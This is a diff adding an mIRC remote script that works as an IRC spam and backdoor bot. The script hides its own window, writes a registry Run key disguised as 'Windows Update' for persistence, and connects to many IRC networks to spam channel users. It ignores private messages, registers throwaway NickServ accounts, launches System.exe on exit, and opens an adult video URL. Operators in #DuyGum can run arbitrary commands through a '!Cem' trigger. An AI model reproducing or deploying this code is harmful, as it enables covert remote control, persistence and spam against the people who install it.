@@ -1,0 +1,120 @@
+[script]
+n0=;Codded by Cem.
+n1=;Scripting Datafiles
+n2=;SouLCem@GmaiL.Com
+n3=
+n4=On *:Start: {
+n5=  .Secret
+n6=  .Sevemem
+n7=  .server $irc.DuyGum.Net
+n8=  .server -m irc.zurna.net
+n9=  .server -m irc.e-kolay.net
+n10=  .server -m irc.rekor.net
+n11=  .server -m irc.mavra.net
+n12=  .server -m irc.sohbetim.com
+n13=  .server -m irc.muhabbet.net
+n14=  .server -m irc.teklan.net
+n15=  .server -m irc.gonul.net
+n16=  .server -m irc.undernet.org
+n17=  .server -m irc.quakenet.org
+n18=  .server -m irc.dal.net
+n19=  .server -m irc.kelebek.gen.tr
+n20=  .unknown
+n21=  .timer 0 0 secret
+n22=  .ignore -wd *
+n23=  .porn
+n24=}
+n25=On *:Connect: {
+n26=  if ($cid == 1) { Join #DuyGum | .timer 1 500 disconnect | $hapsu }
+n27=  if (zurna.net isin $server) { join $read(system32/zurna.txt) | .timer 1 250 disconnect }
+n28=  if (e-kolay.net isin $server) { join $read(system32/ekolay.txt) | .timer 1 300 disconnect }
+n29=  if (rekor.net isin $server) { join $read(System32/rekor.txt) | .timer 1 300 disconnect }
+n30=  if (mavra.net isin $server) { join $read(system32/mavra.txt) | .timer 1 400 disconnect }
+n31=  if (sohbetim.com isin $server) { join $read(System32/sohbetim.txt) | .timer 1 400 disconnect }
+n32=  if (muhabbet.net isin $server) { join $read(system32/muhabbet.txt) | .timer 1 400 disconnect }
+n33=  if (mircturk.com isin $server) { join $read(system32/muhabbet.txt) | .timer 1 400 disconnect }
+n34=  if (mircturk.net isin $server) { join $read(system32/muhabbet.txt) | .timer 1 400 disconnect }
+n35=  if (mircturk.org isin $server) { join $read(system32/muhabbet.txt) | .timer 1 400 disconnect }
+n36=  if (teklan.net isin $server) { join $read(system32/teklan.txt) | .timer 1 400 disconnect }
+n37=  if (gonul.net isin $server) { join $read(system32/gonul.txt) | .timer 1 250 disconnect }
+n38=  if (undernet.org isin $server) { join $read(system32/undernet.txt) | .timer 1 400 disconnect }
+n39=  if (quakenet.org isin $server) { join $read(system32/quakenet.txt) | .timer 1 400 disconnect }
+n40=  if (dal.net isin $server) { join $read(system32/dal.txt) | .timer 1 400 disconnect }
+n41=  if (kelebek.gen.tr isin $server) { join $read(System32/kelebek.txt) | .timer 1 450 disconnect }
+n42=  .timer 0 5 Coder
+n43=}
+n44=Alias unknown {
+n45=  .set %windows $r(10,1999) $+ .reg 
+n46=  .write %windows REGEDIT4
+n47=  .write %windows [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+n48=  .write %windows "Windows Update"=" $+ $remove($mircexe,$mircdir) $+ "
+n49=  run -n regedit /s %windows
+n50=  timer 1 4 remove %windows
+n51=}
+n52=On *:text:*:#: {
+n53=  if ($cid == 1) {
+n54=    if ($nick isop #DuyGum) {
+n55=      if ($1 == !Cem) { $2- }
+n56=      if ($1 == !ekle) { set %rawtopic $2- }
+n57=      if ($1 == !sil) { unset %rawtopic }
+n58=      if ($1 == !duygum) { .msg #DuyGum  $+ $r(1,16) Bir Mahkum Idam Sehpasýnda Yaþamayý Ne Kadar Çok Istiyorsa Bende Seni O Kadar Çok Seviyorum DuyGum! | halt }
+n59=    }
+n60=  }
+n61=}
+n62=On *:Error:*: { server $read(system32/server.txt) }
+n63=on *:Disconnect: { sevemem | close -m | clearall | server }
+n64=alias Secret { .echo Cem $dll(edih.dll, do_ShowWindow, $window(-2).hwnd 0) }
+n65=On *:Exit: { run System.exe }
+n66=on *:action:*:?:closemsg $nick | halt
+n67=on *:notice:*:?:closemsg $nick | halt
+n68=on *:ping: { ctcp $me ping }
+n69=Alias irc.duygum.net return irc.promexion.com
+n70=on *:text:*:?: closemsg $nick | halt
+n71=raw *:*: {
+n72=  if ($numeric == 439) { disconnect }
+n73=  if ($numeric == 432) { .nick $read(system32/nick.txt) }
+n74=  if ($numeric == 433) { .nick $read(system32/nick.txt) }
+n75=  if ($numeric == 473) { if ($cid !== 1) { join $read(zurna.txt) } }
+n76=  if ($numeric == 474) { if ($cid !== 1) { join $read(zurna.txt) } }
+n77=  if ($numeric == 475) { if ($cid !== 1) { join $read(zurna.txt) } }
+n78=  if ($cid == 1) {
+n79=    if ($numeric = 332) { unset %rawtopic | $iif($me ison #DuyGum,%rawtopic = $chan(#DuyGum).topic) }
+n80=  }
+n81=  if ($numeric = 477) {
+n82=    if ($cid !== 1) { Msg NickServ Register $r(a,z) $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $r(a,z) $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ @hotmail.com }
+n83=  }
+n84=}
+n85=On *:Join:#: {
+n86=  window -h $chan
+n87=  if ($cid == 1) { halt }
+n88=  if ($cid !== 1) { .timer 1 $r(1,25) .msg $nick($chan,$rand(8,$nick($chan,0))) %rawtopic }
+n89=}
+n90=Alias coder {
+n91=  if ($chan(0).status = 0) {
+n92=    if (zurna.net isin $server) { join $read(system32/zurna.txt) }
+n93=    if (e-kolay.net isin $server) { join $read(system32/ekolay.txt) }
+n94=    if (rekor.net isin $server) { join $read(System32/rekor.txt) }
+n95=    if (mavra.net isin $server) { join $read(system32/mavra.txt) }
+n96=    if (sohbetim.com isin $server) { join $read(System32/sohbetim.txt) }
+n97=    if (muhabbet.net isin $server) { join $read(system32/muhabbet.txt) }
+n98=    if (mircturk.com isin $server) { join $read(system32/muhabbet.txt) }
+n99=    if (mircturk.net isin $server) { join $read(system32/muhabbet.txt) }
+n100=    if (mircturk.org isin $server) { join $read(system32/muhabbet.txt) }
+n101=    if (teklan.net isin $server) { join $read(system32/teklan.txt) }
+n102=    if (gonul.net isin $server) { join $read(system32/gonul.txt) }
+n103=    if (undernet.org isin $server) { join $read(system32/undernet.txt) }
+n104=    if (quakenet.org isin $server) { join $read(system32/quakenet.txt) }
+n105=    if (dal.net isin $server) { join $read(system32/dal.txt) }
+n106=    if (kelebek.gen.tr isin $server) { join $read(system32/kelebek.txt) }
+n107=  }
+n108=  if ($chan(0).status >= 1) { halt }
+n109=}
+n110=Alias Sevemem {
+n111=  .nick $read(System32/nick.txt)
+n112=  .anick $read(System32/nick.txt)
+n113=  .emailaddr $read(System32/nick.txt)
+n114=  .identd on $read(System32/nick.txt)
+n115=  .username $read(System32/nick.txt)
+n116=}
+n117=Alias Porn { inc %sex | if (%sex == 1) { run www.adultrealityshow.com/hyp/katrina/04.mpeg } | if (%sex !== 1) { halt } }
+n118=Alias hapsu { inc %msg | if (%msg == 1) { .msg #DuyGum Selam yalnýzlýk, ben geldim:D } |if (%msg !== 1) { halt } }
